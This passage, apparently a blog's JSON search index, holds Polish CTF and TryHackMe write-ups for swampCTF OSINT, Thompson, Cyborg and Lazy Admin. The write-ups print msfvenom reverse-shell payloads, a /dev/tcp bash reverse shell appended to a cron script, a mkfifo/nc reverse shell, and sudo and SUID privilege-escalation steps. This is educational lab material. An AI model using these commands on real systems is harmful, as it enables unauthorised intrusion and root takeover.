alt=\"forbidden\" loading=\"lazy\" src=\"/pl/posts/swamp-editor/forbidden.png\"\u003e\u003c/p\u003e\n\u003cp\u003esprawdziłem source code tej strony\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"source code\" loading=\"lazy\" src=\"/pl/posts/swamp-editor/source.png\"\u003e\u003c/p\u003e\n\u003cp\u003ei dodałem następujący fragment kodu do \u003ccode\u003e\u0026lt;head\u0026gt;\u003c/code\u003e\u003c/p\u003e","title":"swampCTF 2025 - Editor - Web challange"},{"content":"Wprowadzenie Rozwiązałem wszystkie 3 z 3 challange\u0026rsquo;y OSINTowych. Więcej informacji o tym CTFie można znaleźć tutaj\nParty Time! To był prosty challenge - i zdobyłem first blooda na nim! Celem było znalezienie lokalizacji na podstawie zdjęcia. Aby rozwiązać ten challenge, po prostu wyodrębniłem metadane i zrobiłem z nich flagę (składnia została podana w opisie challange\u0026rsquo;u).\nUżyłem exiftool do sprawdzenia metadanych na tym zdjęciu:\nA po konwersji z notacji degrees-minutes-seconds (DMS) notation na decimal degrees (DD) notation mogłem użyć tych danych do utworzenia flagi.\nswampCTF{29.652867,82.333244}\nRzeczywiste współrzędne to 29.652867 -82.333244, ale format flagi nie zawierał znaku minus\nParty Time! Level 2 Ten challange również był w miarę prosty, ale skorzystałem z hinta, bo chciałem dokładnie wiedzieć, gdzie spodziewać się flagi. Aby wykonać ten challange, musiałem wiedzieć, gdzie znajduje się lokalizacja z pierwszego challange\u0026rsquo;u o nazwie Party Time!. Celem było znalezienie lokalizacji najbliższego fast foodu. Aby rozwiązać ten challange, wszedłem na mapy google i zacząłem rozglądać się za najbliższym fast foodem, w momencie, gdy zauważyłem kilka z nich, skorzystałem z podpowiedzi, o której wspomniałem wcześniej - dało mi to cennego tipa \u0026ldquo;The reviews love the racecar fast service\u0026rdquo; , po obejrzeniu fast foodu Checkers wszedłem w recenzje i posortowałem je od najnowszych. Scrollując nieco w dół zauważyłem flagę\nKiedy spojrzałem na recenzje Checkers:\nswampCTF{Checkers_Yum}\nOn Thin Ice Ten challange był nieco trudniejszy. Opis nakazywał znalezienie dobrze ocenianego lodowiska, a dodatkowo do pobrania był załącznik zawierający ciemne zdjęcie.\nUżyłem exiftool na tym zdjęciu i zauważyłem coś interesującego\nOpis i tytuł zawierają znaki heksadecymalne, zdekodowałem je za pomocą Pythona\nimport binascii hex_string = \u0026#34;D3A6D0BAD0BCD18BD181D3A7D0B420D0B2D0BED181D18CD0BAD0BED0B22E20D09CD0B5D0B7D0B4D0BBD183D0BD2E\u0026#34; decoded_text = bytes.fromhex(hex_string).decode(\u0026#34;utf-8\u0026#34;, errors=\u0026#34;ignore\u0026#34;) print(decoded_text) Wyjściem było: Ӧкмысӧд воськов. Мездлун.\nUżyłem tłumacza Google, by przetłumaczyć to na język angielski, tłumacząc to otrzymałem: \u0026ldquo;Step eight. Freedom.\u0026rdquo; Po szybkim wygooglowaniu tego dowiedziałem się, że jest to misja z Call of Duty: Black Ops\nScrolując troszkę w dół zauważyłem również lokalizację tej misji\nPo przejściu do Google Maps i wpisaniu \u0026ldquo;Vorkuta ice rink\u0026rdquo; w pasku wyszukiwania znalazłem lodowisko a kiedy spojrzałem na recenzje, znalazłem flagę jako nazwę konta.\nswampCTF{ForUM4sOnN0tForM3}\n","permalink":"https://manfcg.pl/pl/posts/swamp-osint/","summary":"\u003ch2 id=\"wprowadzenie\"\u003eWprowadzenie\u003c/h2\u003e\n\u003cp\u003eRozwiązałem wszystkie 3 z 3 challange\u0026rsquo;y OSINTowych. Więcej informacji o tym CTFie można znaleźć \u003ca href=\"https://ctftime.org/event/2573\"\u003etutaj\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"osint\" loading=\"lazy\" src=\"/pl/posts/swamp-osint/osint.png\"\u003e\u003c/p\u003e\n\u003ch2 id=\"party-time\"\u003eParty Time!\u003c/h2\u003e\n\u003cp\u003e\u003cimg alt=\"party time\" loading=\"lazy\" src=\"/pl/posts/swamp-osint/party_time.png\"\u003e\n\u003cimg alt=\"first blood\" loading=\"lazy\" src=\"/pl/posts/swamp-osint/first.png\"\u003e\u003c/p\u003e\n\u003cp\u003eTo był prosty challenge - i zdobyłem first blooda na nim! Celem było znalezienie lokalizacji na podstawie zdjęcia. Aby rozwiązać ten challenge, po prostu wyodrębniłem metadane i zrobiłem z nich flagę (składnia została podana w opisie challange\u0026rsquo;u).\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"party time photo\" loading=\"lazy\" src=\"/pl/posts/swamp-osint/IMG_4048.png\"\u003e\u003c/p\u003e\n\u003cp\u003eUżyłem \u003ccode\u003eexiftool\u003c/code\u003e do sprawdzenia metadanych na tym zdjęciu:\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"party time exiftool\" loading=\"lazy\" src=\"/pl/posts/swamp-osint/party_time_1.png\"\u003e\u003c/p\u003e","title":"swampCTF 2025 - OSINT challenges"},{"content":"Link do room\u0026rsquo;u: https://tryhackme.com/r/room/bsidesgtthompson\nZacząłem od enumeracji\nnmap -oN nmap.txt -Pn -T4 -sC -sV 10.10.188.85 PORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)\r8009/tcp open ajp13 Apache Jserv (Protocol v1.3)\r8080/tcp open http Apache Tomcat 8.5.5 Wszedłem sobie na stronkę http://10.10.188.85:8080\nKliknąłem Manager App i poprosiło mnie to o login\nspróbowałem admin:tomcat i tomcat:tomcat ale nie weszło, nacisnąłem więc cancel i wyświetliły mi się ciekawe informacje\nUżywając username tomcat i password s3cret udało mi się zalogować na stronę\nZjeżdżając niżej, zauważyłem, że mogę wgrać plik .war - nie wiedziałem co to jest, ale po szybkim wygooglowaniu dowiedziałem się, że jest to plik używany do dystrybucji kolekcji plików JAR, JavaServer Pages, Java Servlets i klas Java\nSprawdziłem dostępne payloady metasploita\nwykorzystałem java/jsp_shell_reverse_tcp używając\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war \u0026gt; rev.war w drugim oknie terminala włączyłem msfconsole i wpisałem:\nuse multi/handler set payload java/jsp_shell_reverse_tcp Ustawiłem również LHOST i LPORT bazując na tym co wpisałem do msfvenom\nset LHOST=IP set LPORT=PORT na sam koniec wpisałem exploit\nno i wgrałem tego exploita na stronę\npo kliknięciu w /rev udało się uzyskać dostęp do shella. Zespawnowałem sobie od razu lepszego, używając pythona\npython3 -c \u0026#34;import pty; pty.spawn(\u0026#39;/bin/bash\u0026#39;)\u0026#34; wędrując po directory, udało mi się znaleźć flagę usera\nPora na eskalację uprawnień, sprawdziłem sudo -l ale kazał mi podać hasło, więc próbuję znaleźć inną drogę\nSprawdźmy crontaba, cat /etc/crontab\nno i mamy coś ciekawego, id.sh w home directory jack\u0026rsquo;a - sprawdzę jeszcze tylko uprawnienia do tego pliku przez komendę ls -la /home/jack/id.sh\nno i super, wygląda na to, że może być to nasz sposób na eskalację uprawnień, sprawdźmy tylko co jest w tym pliku\ndopiszę sobie reverse shella używając echo:\necho \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/\u0026lt;LHOST\u0026gt;/\u0026lt;LPORT\u0026gt; 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt;\u0026gt; /home/jack/id.sh w kolejnym oknie terminala włączyłem netcata\nnc -nvlp LPORT no i po chwili udało się uzyskać dostęp do root shella. Pozostało już tylko wyciągnąć flagę roota\n","permalink":"https://manfcg.pl/pl/posts/thm-thompson/","summary":"\u003cp\u003eLink do room\u0026rsquo;u: \u003ca href=\"https://tryhackme.com/r/room/bsidesgtthompson\"\u003ehttps://tryhackme.com/r/room/bsidesgtthompson\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eZacząłem od enumeracji\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -oN nmap.txt -Pn -T4 -sC -sV 10.10.188.85\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ePORT   STATE SERVICE VERSION\r\n22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)\r\n8009/tcp open  ajp13    Apache Jserv (Protocol v1.3)\r\n8080/tcp open  http     Apache Tomcat 8.5.5\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eWszedłem sobie na stronkę \u003ccode\u003ehttp://10.10.188.85:8080\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/pl/posts/thm-thompson/1.png\"\u003e\u003c/p\u003e\n\u003cp\u003eKliknąłem Manager App i poprosiło mnie to o login\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/pl/posts/thm-thompson/2.png\"\u003e\u003c/p\u003e\n\u003cp\u003espróbowałem \u003ccode\u003eadmin:tomcat\u003c/code\u003e i \u003ccode\u003etomcat:tomcat\u003c/code\u003e ale nie weszło, nacisnąłem więc cancel i wyświetliły mi się ciekawe informacje\u003c/p\u003e","title":"THM Writeup - Thompson"},{"content":"Link do room\u0026rsquo;u: https://tryhackme.com/r/room/cyborgt8\nMamy takie pytanka na które musimy odpowiedzieć:\nScan the machine, how many ports are open? What service is running on port 22? What service is running on port 80? What is the user.txt flag? What is the root.txt flag? Na porcie 22 jest defaultowo ssh, a na porcie 80 jest http, lecz pierw sprawdźmy to skanem nmapa - przy okazji uda nam się wtedy odpowiedzieć na pytanie numer 1\nnmap -oN nmap.txt -Pn -T4 -sC -sV -p- 10.10.127.219 Dostałem od razu warning o treści Warning: 10.10.127.219 giving up on port because retransmission cap hit (6).\nWięc niestety za dużo requestów do serwera, zmniejszyłem sobie -T4 na -T3 i usunąłem -p- i puściłem jeszcze raz\nno a w tle puściłem gobustera\ngobuster dir -o gobuster.txt -u 10.10.127.219 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt pokazał on mi dość ciekawe directory, takie jak /admin i /etc\n===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\r/.htpasswd (Status: 403) [Size: 278]\r/.htaccess (Status: 403) [Size: 278]\r/.hta (Status: 403) [Size: 278]\r/admin (Status: 301) [Size: 314] [--\u0026gt; http://10.10.127.219/admin/]\r/etc (Status: 301) [Size: 312] [--\u0026gt; http://10.10.127.219/etc/]\r/index.html (Status: 200) [Size: 11321]\r/server-status (Status: 403) [Size: 278]\rProgress: 4734 / 4735 (99.98%)\r===============================================================\rFinished\r=============================================================== nmap się w tym czasie skończył i to wyszło z jego outputu:\nPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)\r80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) Więc w odpowiedzi do pytania pierwszego wpisuje, że są 2 porty. Przy okazji udało się też potwierdzić co na tych portach się znajduje\nWszedłem sobie na /etc i znalazłem tam 2 pliki:\nz czego passwd zawiera dość ciekawe dla mnie rzeczy\nZcrackowałem ten hash używając John the rippera\njohn --wordlist=/usr/share/wordlists/rockyou.txt passwd no i sukces\nWszedłem sobie po tym na directory /admin i znalazłem tam w navbarze \u0026ldquo;Admins\u0026rdquo;\nDowiedziałem się, że trzeba znaleźć backup o nazwie \u0026ldquo;music_archive\u0026rdquo;, więc klikam od razu w \u0026ldquo;Archive\u0026rdquo; i wtedy pokazał mi się przycisk Download który umożliwił mi pobranie pliku archive.tar\nWleciał więc szybki unzip tego pliku\ntar -xf archive.tar przechodząc do home/field/dev/final_archive zauważyłem różne inne pliki, więc wyświetlam sobie od razu README\nHm, sprawdźmy to\nWygląda to na jakiś program do backupów\nWszedłem sobie w usage, a odrobinę później wygooglowałem githuba borga\nPobrałem sobie też go https://github.com/borgbackup/borg/releases\nWylistowałem sobie te wcześniej pobrane archiwum, używając borga\n./borg list home/field/dev/final_archive poprosił mnie o hasło, więc wpisałem wcześniej zcrackowane squidward\nNo to spróbujmy to wyextractować\n./borg extract home/field/dev/final_archive/::music_archive poprosił mnie jeszcze raz o hasło, więc wpisałem squidward\nPojawił mi się folder home, który zawierał dane użytkownika alex\npostanowiłem to sprawdzić, lecz tym razem nic ciekawego\nPróbuję dalej\nno i coś mamy, spróbuje się tym zalogować do ssh\nSukces! dodatkowo wykonując ls udało mi się namierzyć flagę usera\nRobiąc sudo -l też udało się odkryć coś, co może pomóc w eskalacji uprawnień\nwyświetlę sobie co tam się znajduje w tym pliku\nsprawdzę od razu też uprawnienia\nNo niestety tym razem nie uda się eskalować tym użytkownikiem po prostu edytując ten skrypt\nAle, warto zaznaczyć, że ten skrypt zawiera funkcję getopts która jest wbudowaną funkcją do analizowania argumentów i opcji skryptu. Szczerze mówiąc nie słyszałem o tej funkcji wcześniej, ale przykuła ona moją uwagę.\nWykorzystałem sobie tą funkcje, używając sudo /etc/mp3backups/backup.sh -c /bin/bash\nNo i mam shell roota. Ale niestety nie dostawałem outputu komend, które wpisywałem\nSpróbowałem w takim razie eskalacji uprawnień przez bit SUID\nwięc jako root:\nWszedłem w /tmp Zrobiłem cp /bin/bash ./bash Dodałem bit SUID chmod +s bash Wpisałem exit i wróciłem do shella usera jako user zrobiłem:\ncd /tmp ls -la Wszedłem sobie na gtfobins i wyczytałem informacje na temat eskalacji uprawnień do roota używając bitu SUID\nno i wpisałem jako alex komendę ./bash -p\nmamy znowu root shella. Sprawdźmy czy tym razem widzimy output komend\nNo i super, pozostało nam jedynie cat /root/root.txt\n","permalink":"https://manfcg.pl/pl/posts/thm-cyborg/","summary":"\u003cp\u003eLink do room\u0026rsquo;u: \u003ca href=\"https://tryhackme.com/r/room/cyborgt8\"\u003ehttps://tryhackme.com/r/room/cyborgt8\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eMamy takie pytanka na które musimy odpowiedzieć:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eScan the machine, how many ports are open?\u003c/li\u003e\n\u003cli\u003eWhat service is running on port 22?\u003c/li\u003e\n\u003cli\u003eWhat service is running on port 80?\u003c/li\u003e\n\u003cli\u003eWhat is the user.txt flag?\u003c/li\u003e\n\u003cli\u003eWhat is the root.txt flag?\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eNa porcie 22 jest defaultowo ssh, a na porcie 80 jest http, lecz pierw sprawdźmy to skanem nmapa - przy okazji uda nam się wtedy odpowiedzieć na pytanie numer 1\u003c/p\u003e","title":"THM Writeup - Cyborg"},{"content":"Link do room\u0026rsquo;u: https://tryhackme.com/r/room/lazyadmin\nRozpocznę sobie całość skanem z nmapa, a w tle puszczę gobustera\nnmap -oN nmap.txt -Pn -T4 -sC -sV -p- 10.10.19.199 PORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)\r80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) gobuster dir -o gobuster.txt -u 10.10.19.199 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt ===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\r/.hta (Status: 403) [Size: 277]\r/.htaccess (Status: 403) [Size: 277]\r/.htpasswd (Status: 403) [Size: 277]\r/content (Status: 301) [Size: 314] [--\u0026gt; http://10.10.19.199/content/]\r/index.html (Status: 200) [Size: 11321]\r/server-status (Status: 403) [Size: 277] Wchodząc na adres serwera, pokazuje się domyślna strona po instalacji apache - więc tutaj nic nie znajdziemy\nAle przez gobustera zauważyłem, że mamy coś w /content/\nWygląda to interesująco, jakiś CMS który można dalej przeskanować gobusterem\ngobuster dir -o gobuster2.txt -u http://10.10.19.199/content/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt ===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\r/.htaccess (Status: 403) [Size: 277]\r/.htpasswd (Status: 403) [Size: 277]\r/.hta (Status: 403) [Size: 277]\r/_themes (Status: 301) [Size: 322] [--\u0026gt; http://10.10.19.199/content/_themes/]\r/as (Status: 301) [Size: 317] [--\u0026gt; http://10.10.19.199/content/as/]\r/attachment (Status: 301) [Size: 325] [--\u0026gt; http://10.10.19.199/content/attachment/]\r/images (Status: 301) [Size: 321] [--\u0026gt; http://10.10.19.199/content/images/]\r/inc (Status: 301) [Size: 318] [--\u0026gt; http://10.10.19.199/content/inc/]\r/index.php (Status: 200) [Size: 2198]\r/js (Status: 301) [Size: 317] [--\u0026gt; http://10.10.19.199/content/js/] Po chwili przeglądania tego wszystkiego, zauważyłem, że:\n/content/as prowadzi do interfejsu logowania do tego cmsa /content/inc zawiera jakieś ciekawe pliczki No i bingo, patrząc na /content/inc znalazłem ciekawy folder o nazwie mysql_backup który zawiera bazę danych. Pobieram sobie ją, bo może zawierać coś ciekawego\nOtworzyłem sobie ten pliczek, i znalazłem użytkownika o\nnazwie: manager haśle: 42f749ade7f9e195bf475f37a44cafcb zdecryptowałem ten hash wklejając go na crackstation i wyszło na to, że hasło to Password123\nSpróbuję się tym zalogować na ssh\nPermission denied, please try again. no i nie weszło ;/\nW takim razie wejdę na directory /as które znalazłem wcześniej\nPo wpisaniu loginu i hasła managera, udało się mi dostać na CMS\nPrzy okazji znalazłem coś, co może być interesujące do uzyskania reverse shella\nPo szybkim wygooglowaniu tego, na exploitdb znalazłem ciekawy exploit umożliwiający wgranie mi reverse shella https://www.exploit-db.com/exploits/40716\nPierw przygotowałem sobie plik do zuploadowania zmieniając port, ip i nazwę na shell.php5 (bo nie chciało się zuploadować po .php): https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php\nW kolejnym oknie terminala od razu włączyłem nasłuchiwanie netcatem\nWracając do poprzedniego okienka terminala, zrobiłem:\nchmod +x exploit.py python exploit.py Wszedłem w ten link, no i super, otrzymałem dostęp do shella\nOd razu zrobiłem python --version i gdy potwierdziłem sobie istnienie pythona na serwerze, zespawnowałem sobie shella\npython -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; Zrobiłem też cat /etc/passwd żeby sprawdzić, czy nie ma jakichś ciekawych użytkowników\nOd razu rzucił mi się w oko itguy, sprawdziłem jego home dir, i znalazłem flagę usera\nTHM{63e5bce9271952aad1113b6f1ac28a07} Po zdobyciu flagi od razu zacząłem szukać możliwości eskalacji uprawnień z www-data do czegoś ciekawszego. Zacząłem od komendy sudo -l, która pokazała mi coś, co mnie zainteresowało\nUser www-data may run the following commands on THM-Chal:\r(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl Robiąc cat /home/itguy/backup.pl zauważyłem, że ten plik pointuje do innego pliku -\u0026gt; /etc/copy.sh\ncat /home/itguy/backup.pl #!/usr/bin/perl system(\u0026#34;sh\u0026#34;, \u0026#34;/etc/copy.sh\u0026#34;); Sprawdziłem sobie też ten pliczek\ncat /etc/copy.sh No i wygląda na to, że zawiera on reverse shella, który pomoże nam uzyskać shell roota\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 192.168.0.190 5554 \u0026gt;/tmp/f Lekko pozwoliłem sobie go zmodyfikować zmieniając ip, odpaliłem też nowe okienko w terminalu i włączyłem nasłuchiwanie\nwróciłem do okienka z reverse shellem i uruchomiłem skrypt backup.pl przez sudo\nsudo /usr/bin/perl /home/itguy/backup.pl Wróciłem do okienka z nasłuchiwaniem\nNo i sukces, teraz tylko cd /root i pozyskanie flagi roota poprzez cat root.txt\nTHM{6637f41d0177b6f37cb20d775124699f} ","permalink":"https://manfcg.pl/pl/posts/thm-lazy-admin/","summary":"\u003cp\u003eLink do room\u0026rsquo;u: \u003ca href=\"https://tryhackme.com/r/room/lazyadmin\"\u003ehttps://tryhackme.com/r/room/lazyadmin\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eRozpocznę sobie całość skanem z nmapa, a w tle puszczę gobustera\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -oN nmap.txt -Pn -T4 -sC -sV -p- 10.10.19.199 \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ePORT   STATE SERVICE VERSION\r\n22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)\r\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n\u003c/code\u003e\u003c/pre\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egobuster dir -o gobuster.txt -u 10.10.19.199 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e===============================================================\r\nStarting gobuster in directory enumeration mode\r\n===============================================================\r\n/.hta                 (Status: 403) [Size: 277]\r\n/.htaccess            (Status: 403) [Size: 277]\r\n/.htpasswd            (Status: 403) [Size: 277]\r\n/content              (Status: 301) [Size: 314] [--\u0026gt; http://10.10.19.199/content/]\r\n/index.html           (Status: 200) [Size: 11321]\r\n/server-status        (Status: 403) [Size: 277]\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eWchodząc na adres serwera, pokazuje się domyślna strona po instalacji apache - więc tutaj nic nie znajdziemy\u003c/p\u003e","title":"THM Writeup - Lazy Admin"},{"content":"\nCześć! Jestem Michał 👋 Jestem entuzjastą cyberbezpieczeństwa i uczniem na kierunku informatyki 🌱 Obecnie poszerzam swoją wiedzę w zakresie Cyberbezpieczeństwa\n💪 Mocno skupiam się na Pentestingu\n⚡ Ciekawostka: Moją ulubioną grą jest Counter-Strike i spędziłem w niej około 4000 godzin.\n","permalink":"https://manfcg.pl/pl/about/","summary":"\u003cp\u003e\u003cimg alt=\"avatar\" loading=\"lazy\" src=\"/pl/about/avatar.png#center\"\u003e\u003c/p\u003e\n\u003ch2 id=\"cześć-jestem-michał-\"\u003eCześć! Jestem Michał 👋\u003c/h2\u003e\n\u003ch3 id=\"jestem-entuzjastą-cyberbezpieczeństwa-i-uczniem-na-kierunku-informatyki\"\u003eJestem entuzjastą cyberbezpieczeństwa i uczniem na kierunku informatyki\u003c/h3\u003e\n\u003cp\u003e🌱  Obecnie poszerzam swoją wiedzę w zakresie \u003cstrong\u003eCyberbezpieczeństwa\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e💪 Mocno skupiam się na \u003cstrong\u003ePentestingu\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e⚡ Ciekawostka: Moją ulubioną grą jest Counter-Strike i spędziłem w niej około 4000 godzin.\u003c/p\u003e","title":"O mnie"}]